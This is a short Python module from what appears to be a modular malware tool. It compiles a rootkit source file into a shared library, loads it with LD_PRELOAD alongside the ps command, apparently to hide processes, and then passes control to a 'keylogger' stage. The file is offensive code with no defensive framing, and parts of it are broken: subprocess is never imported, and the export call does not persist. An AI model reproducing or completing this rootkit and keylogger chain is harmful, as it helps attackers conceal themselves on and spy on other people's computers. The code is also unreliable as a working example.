###########################################################################################################################
####################################################     LIBRARIES     ####################################################
###########################################################################################################################
from pathlib import Path


###########################################################################################################################
#################################################     INITIALIZATIONS     #################################################
###########################################################################################################################

def exec_bash(cmd, output=True):
    return subprocess.check_output(cmd, shell=True)

###########################################################################################################################
#####################################################     PROGRAM     #####################################################
###########################################################################################################################

def run():
    next_action = ""
    data = "no_data"
    print("[+] Rootkit module activated...")

    exec_bash("gcc -fPIC -shared -o ./utils/rootkit.so ./utils/rootkit.c -ldl")
    exec_bash(f"export LD_PRELOAD=./utils/rootkit.so ps")

    next_action = "keylogger"
    return data, next_action
